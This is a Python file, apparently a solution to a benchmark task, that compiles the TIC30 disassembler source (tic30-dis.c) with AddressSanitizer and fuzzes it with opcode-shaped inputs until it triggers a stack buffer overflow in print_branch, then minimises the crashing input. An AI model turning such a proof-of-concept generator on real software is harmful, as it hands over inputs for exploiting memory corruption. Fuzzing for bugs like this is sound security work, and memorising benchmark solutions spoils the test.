import os
import re
import tarfile
import tempfile
import subprocess
import shutil
import time
import hashlib
import itertools
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Tuple, Optional


def _safe_extract_tar(tar_path: str, dst_dir: str) -> None:
    with tarfile.open(tar_path, mode="r:*") as tf:
        members = tf.getmembers()
        for m in members:
            mpath = m.name
            if mpath.startswith("/") or mpath.startswith("\\"):
                continue
            # avoid path traversal
            out_path = os.path.realpath(os.path.join(dst_dir, mpath))
            if not out_path.startswith(os.path.realpath(dst_dir) + os.sep) and out_path != os.path.realpath(dst_dir):
                continue
            tf.extract(m, path=dst_dir, set_attrs=False)


def _find_file(root: str, filename: str) -> Optional[str]:
    for d, _, files in os.walk(root):
        if filename in files:
            return os.path.join(d, filename)
    return None


def _list_c_files(root: str) -> List[str]:
    out = []
    for d, _, files in os.walk(root):
        for f in files:
            if f.endswith(".c"):
                out.append(os.path.join(d, f))
    return out


def _file_contains_main(c_path: str) -> bool:
    try:
        with open(c_path, "rb") as f:
            data = f.read(200000)
    except Exception:
        return False
    # crude but effective
    if b"int main" in data or b" main(" in data or b"main (" in data:
        # avoid false positives in comments by requiring a '(' close by
        idx = data.find(b"main")
        if idx != -1:
            window = data[idx:idx + 200]
            if b"(" in window and b")" in window:
                return True
    return False


def _choose_compiler() -> str:
    for cc in ("clang", "gcc", "cc"):
        try:
            r = subprocess.run([cc, "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
            if r.returncode == 0:
                return cc
        except Exception:
            continue
    return "cc"


def _attempt_compile(cc: str, cwd: str, cfiles: List[str], include_dirs: List[str], out_exe: str) -> bool:
    flags = [
        "-O1",
        "-g",
        "-std=c99",
        "-fno-omit-frame-pointer",
        "-fsanitize=address",
        "-fno-common",
        "-D_GNU_SOURCE",
    ]
    incs = []
    seen = set()
    for inc in include_dirs:
        inc = os.path.abspath(inc)
        if inc not in seen and os.path.isdir(inc):
            incs.append("-I" + inc)
            seen.add(inc)
    cmd = [cc] + flags + incs + cfiles + ["-o", out_exe, "-lm"]
    try:
        r = subprocess.run(cmd, cwd=cwd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=120)
        if r.returncode == 0 and os.path.isfile(os.path.join(cwd, out_exe)):
            return True
    except Exception:
        return False
    return False


def _build_executable(src_root: str, tic30_dis_c: str) -> Optional[str]:
    cc = _choose_compiler()
    dis_dir = os.path.dirname(os.path.abspath(tic30_dis_c))
    out_exe = "tic30_dis_poc_bin"
    include_dirs = [dis_dir, os.path.dirname(dis_dir), src_root]

    # Compile strategies from narrow to broad
    candidates = []

    # Level 0: only tic30-dis.c
    candidates.append([tic30_dis_c])

    # Level 1: all .c in same directory (excluding other mains)
    same_dir_cs = []
    for f in os.listdir(dis_dir):
        if f.endswith(".c"):
            p = os.path.join(dis_dir, f)
            same_dir_cs.append(p)
    level1 = []
    for p in same_dir_cs:
        if os.path.abspath(p) == os.path.abspath(tic30_dis_c):
            level1.append(p)
        else:
            if not _file_contains_main(p):
                level1.append(p)
    candidates.append(level1)

    # Level 2: add parent directory .c files (excluding other mains)
    parent_dir = os.path.dirname(dis_dir)
    parent_cs = []
    if parent_dir and os.path.isdir(parent_dir):
        for f in os.listdir(parent_dir):
            if f.endswith(".c"):
                parent_cs.append(os.path.join(parent_dir, f))
    level2 = list(level1)
    for p in parent_cs:
        ap = os.path.abspath(p)
        if ap == os.path.abspath(tic30_dis_c):
            continue
        if ap not in map(os.path.abspath, level2) and not _file_contains_main(p):
            level2.append(p)
    candidates.append(level2)

    # Level 3: all .c in tree but exclude other mains, cap size
    all_cs = _list_c_files(src_root)
    all_level = []
    for p in all_cs:
        ap = os.path.abspath(p)
        if ap == os.path.abspath(tic30_dis_c):
            continue
        if not _file_contains_main(p):
            all_level.append(p)
    # Ensure tic30-dis.c first
    level3 = [tic30_dis_c] + [p for p in all_level if os.path.abspath(p) != os.path.abspath(tic30_dis_c)]
    if len(level3) > 220:
        # cap to avoid huge builds; keep nearest files to dis_dir
        def score(p: str) -> int:
            ap = os.path.abspath(p)
            dd = os.path.abspath(dis_dir)
            common = os.path.commonpath([ap, dd])
            return -len(common)
        level3 = [tic30_dis_c] + sorted(level3[1:], key=score)[:160]
    candidates.append(level3)

    # Try compilation
    for cset in candidates:
        # remove duplicates
        uniq = []
        seen = set()
        for p in cset:
            ap = os.path.abspath(p)
            if ap not in seen and os.path.isfile(ap):
                uniq.append(ap)
                seen.add(ap)
        # must contain tic30-dis.c
        if os.path.abspath(tic30_dis_c) not in seen:
            continue
        # cleanup old exe
        try:
            os.remove(os.path.join(dis_dir, out_exe))
        except Exception:
            pass
        ok = _attempt_compile(cc, dis_dir, uniq, include_dirs, out_exe)
        if ok:
            exe_path = os.path.join(dis_dir, out_exe)
            try:
                os.chmod(exe_path, 0o755)
            except Exception:
                pass
            return exe_path

    return None


def _extract_print_branch_patterns(tic30_dis_c_path: str) -> Tuple[List[Tuple[int, int]], int]:
    try:
        txt = open(tic30_dis_c_path, "r", encoding="utf-8", errors="ignore").read()
    except Exception:
        return ([], 16)

    lines = txt.splitlines()
    relevant = []
    for ln in lines:
        if "print_branch" in ln and "{" in ln and "}" in ln:
            relevant.append(ln)

    hex_re = re.compile(r"0x[0-9A-Fa-f]+")
    pairs = set()
    all_nums = []
    for ln in relevant:
        nums = [int(x, 16) for x in hex_re.findall(ln)]
        if len(nums) >= 2:
            all_nums.extend(nums)
            # try all ordered pairs from these numbers
            for i in range(len(nums)):
                for j in range(len(nums)):
                    if i == j:
                        continue
                    a = nums[i]
                    b = nums[j]
                    # interpret as (mask, value)
                    if (b & a) == b:
                        pairs.add((a, b))
                    # interpret as (value, mask)
                    if (a & b) == a:
                        pairs.add((b, a))

    word_bits = 16
    if any(n > 0xFFFF for n in all_nums):
        word_bits = 32
    word_mask = (1 << word_bits) - 1
    norm_pairs = []
    for m, v in pairs:
        m &= word_mask
        v &= word_mask
        if (v & m) == v:
            norm_pairs.append((m, v))
    # stable order
    norm_pairs.sort(key=lambda x: (x[0], x[1]))
    return (norm_pairs, word_bits)


class _Tester:
    def __init__(self, exe_path: str, tmpdir: str, mode: str):
        self.exe_path = exe_path
        self.tmpdir = tmpdir
        self.mode = mode  # "file", "stdin", "dash"
        self._counter = itertools.count()
        self._lock = threading.Lock()
        self.env = os.environ.copy()
        self.env["ASAN_OPTIONS"] = "abort_on_error=1:detect_leaks=0:exitcode=113:symbolize=0"

    def _mkpath(self) -> str:
        with self._lock:
            i = next(self._counter)
        return os.path.join(self.tmpdir, f"in_{i}.bin")

    def run(self, data: bytes, timeout: float = 0.5) -> Tuple[int, bytes]:
        if self.mode == "stdin":
            try:
                r = subprocess.run([self.exe_path], input=data, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE,
                                   timeout=timeout, env=self.env)
                return r.returncode, r.stderr or b""
            except subprocess.TimeoutExpired:
                return 0, b""
            except Exception as e:
                return 0, (str(e).encode("utf-8", "ignore") if e else b"")
        elif self.mode == "dash":
            try:
                r = subprocess.run([self.exe_path, "-"], input=data, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE,
                                   timeout=timeout, env=self.env)
                return r.returncode, r.stderr or b""
            except subprocess.TimeoutExpired:
                return 0, b""
            except Exception as e:
                return 0, (str(e).encode("utf-8", "ignore") if e else b"")
        else:
            p = self._mkpath()
            try:
                with open(p, "wb") as f:
                    f.write(data)
                r = subprocess.run([self.exe_path, p], stdout=subprocess.DEVNULL, stderr=subprocess.PIPE,
                                   timeout=timeout, env=self.env)
                return r.returncode, r.stderr or b""
            except subprocess.TimeoutExpired:
                return 0, b""
            except Exception as e:
                return 0, (str(e).encode("utf-8", "ignore") if e else b"")
            finally:
                try:
                    os.remove(p)
                except Exception:
                    pass

    @staticmethod
    def is_target_crash(rc: int, stderr: bytes) -> bool:
        if rc == 0:
            return False
        s = stderr or b""
        if b"AddressSanitizer" not in s and b"stack-buffer-overflow" not in s:
            return False
        if b"stack-buffer-overflow" not in s:
            return False
        if b"print_branch" not in s:
            return False
        return True


def _determine_invocation_mode(exe_path: str, tmpdir: str) -> str:
    env = os.environ.copy()
    env["ASAN_OPTIONS"] = "abort_on_error=1:detect_leaks=0:exitcode=113:symbolize=0"
    sample = b"\x00" * 64
    # Try file mode first
    p = os.path.join(tmpdir, "probe.bin")
    try:
        with open(p, "wb") as f:
            f.write(sample)
        r = subprocess.run([exe_path, p], stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, timeout=1.0, env=env)
        err = (r.stderr or b"").lower()
        if b"usage" not in err:
            return "file"
    except Exception:
        pass
    finally:
        try:
            os.remove(p)
        except Exception:
            pass

    # Try stdin
    try:
        r = subprocess.run([exe_path], input=sample, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, timeout=1.0, env=env)
        err = (r.stderr or b"").lower()
        if b"usage" not in err:
            return "stdin"
    except Exception:
        pass

    # Try dash
    try:
        r = subprocess.run([exe_path, "-"], input=sample, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, timeout=1.0, env=env)
        err = (r.stderr or b"").lower()
        if b"usage" not in err:
            return "dash"
    except Exception:
        pass

    return "file"


def _randbytes(rng, n: int) -> bytes:
    try:
        return rng.randbytes(n)  # py3.9+
    except Exception:
        return bytes([rng.getrandbits(8) for _ in range(n)])


def _place_opcode(data: bytearray, opcode: int, offset: int, word_bytes: int, endian: str) -> bool:
    if offset < 0 or offset + word_bytes > len(data):
        return False
    data[offset:offset + word_bytes] = opcode.to_bytes(word_bytes, endian, signed=False)
    return True


def _gen_candidate(length: int, word_bits: int, endian: str, patterns: List[Tuple[int, int]], offset: int, rng) -> bytes:
    word_mask = (1 << word_bits) - 1
    word_bytes = word_bits // 8
    data = bytearray(_randbytes(rng, length))
    if patterns:
        mask, value = patterns[rng.randrange(len(patterns))]
        free = (~mask) & word_mask
        opcode = (value | (rng.getrandbits(word_bits) & free)) & word_mask
    else:
        opcode = rng.getrandbits(word_bits) & word_mask
    if not _place_opcode(data, opcode, offset, word_bytes, endian):
        # fallback to start
        _place_opcode(data, opcode, 0, word_bytes, endian)
    return bytes(data)


def _minimize(data: bytes, tester: _Tester, max_time: float) -> bytes:
    start = time.time()

    def ok(d: bytes) -> bool:
        if time.time() - start > max_time:
            return False
        rc, err = tester.run(d, timeout=0.5)
        return tester.is_target_crash(rc, err)

    if not ok(data):
        return data

    # Trim end
    changed = True
    while changed and len(data) > 1 and time.time() - start <= max_time:
        changed = False
        cand = data[:-1]
        if ok(cand):
            data = cand
            changed = True

    # Single-byte deletion pass
    changed = True
    while changed and len(data) > 1 and time.time() - start <= max_time:
        changed = False
        for i in range(len(data)):
            if time.time() - start > max_time:
                break
            cand = data[:i] + data[i + 1:]
            if ok(cand):
                data = cand
                changed = True
                break

    # Byte simplification: try 0x00 then 0xFF
    b = bytearray(data)
    for i in range(len(b)):
        if time.time() - start > max_time:
            break
        orig = b[i]
        if orig != 0:
            b[i] = 0
            if ok(bytes(b)):
                continue
            b[i] = orig
        if orig != 0xFF:
            b[i] = 0xFF
            if ok(bytes(b)):
                continue
            b[i] = orig
    data = bytes(b)

    return data


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Hard fallback
        fallback = b"\x00" * 10

        workdir = tempfile.mkdtemp(prefix="tic30_poc_")
        try:
            try:
                _safe_extract_tar(src_path, workdir)
            except Exception:
                return fallback

            tic30_dis_c = _find_file(workdir, "tic30-dis.c")
            if not tic30_dis_c:
                return fallback

            patterns, word_bits = _extract_print_branch_patterns(tic30_dis_c)
            exe = _build_executable(workdir, tic30_dis_c)
            if not exe or not os.path.isfile(exe):
                return fallback

            tmpdir = tempfile.mkdtemp(prefix="tic30_run_", dir=workdir)
            try:
                mode = _determine_invocation_mode(exe, tmpdir)
                tester = _Tester(exe, tmpdir, mode)

                # Deterministic seed from source
                try:
                    with open(tic30_dis_c, "rb") as f:
                        h = hashlib.sha256(f.read()).digest()
                    seed = int.from_bytes(h[:8], "little", signed=False)
                except Exception:
                    seed = 0x12345678

                import random
                rng = random.Random(seed)

                endians = ["little", "big"]
                offsets = [0]
                word_bytes = max(1, word_bits // 8)
                for off in (0, word_bytes, 2 * word_bytes, 3 * word_bytes, 4 * word_bytes):
                    if off not in offsets:
                        offsets.append(off)

                # Target length tries around expected 10
                lengths = [10, 8, 12, 6, 14, 16, 4, 18, 20, 24, 32]

                def test_data(d: bytes) -> bool:
                    rc, err = tester.run(d, timeout=0.5)
                    return tester.is_target_crash(rc, err)

                # Quick fixed candidates (cheap)
                fixed_candidates = []
                for L in lengths[:4]:
                    fixed_candidates.append(b"\x00" * L)
                    fixed_candidates.append(b"\xFF" * L)
                    fixed_candidates.append((b"\x00\xFF" * (L // 2)) + (b"\x00" if L % 2 else b""))
                    fixed_candidates.append((b"\xFF\x00" * (L // 2)) + (b"\xFF" if L % 2 else b""))
                for d in fixed_candidates:
                    if test_data(d):
                        return _minimize(d, tester, max_time=4.0)

                # Try direct opcode placements from patterns with simple fills
                word_mask = (1 << word_bits) - 1
                fills = [0, word_mask]
                if patterns:
                    for mask, value in patterns[: min(64, len(patterns))]:
                        free = (~mask) & word_mask
                        fills2 = fills + [free, (free & 0xAAAAAAAA) & word_mask, (free & 0x55555555) & word_mask]
                        for L in lengths[:6]:
                            for endian in endians:
                                for off in offsets:
                                    if off + word_bytes > L:
                                        continue
                                    for fill in fills2:
                                        op = (value | (fill & free)) & word_mask
                                        buf = bytearray(b"\x00" * L)
                                        _place_opcode(buf, op, off, word_bytes, endian)
                                        d = bytes(buf)
                                        if test_data(d):
                                            return _minimize(d, tester, max_time=6.0)

                # Randomized search (parallel)
                deadline = time.time() + 18.0
                max_workers = min(8, (os.cpu_count() or 2))
                batch = 128

                with ThreadPoolExecutor(max_workers=max_workers) as ex:
                    while time.time() < deadline:
                        # cycle lengths/endians/offsets
                        for L in lengths:
                            if time.time() >= deadline:
                                break
                            for endian in endians:
                                if time.time() >= deadline:
                                    break
                                for off in offsets:
                                    if time.time() >= deadline:
                                        break
                                    if off + word_bytes > L:
                                        continue

                                    datas = [_gen_candidate(L, word_bits, endian, patterns, off, rng) for _ in range(batch)]
                                    futs = [ex.submit(tester.run, d, 0.5) for d in datas]
                                    for fut, d in zip(futs, datas):
                                        if time.time() >= deadline:
                                            break
                                        try:
                                            rc, err = fut.result(timeout=1.0)
                                        except Exception:
                                            continue
                                        if tester.is_target_crash(rc, err):
                                            return _minimize(d, tester, max_time=8.0)

                return fallback
            finally:
                try:
                    shutil.rmtree(tmpdir, ignore_errors=True)
                except Exception:
                    pass
        finally:
            try:
                shutil.rmtree(workdir, ignore_errors=True)
            except Exception:
                pass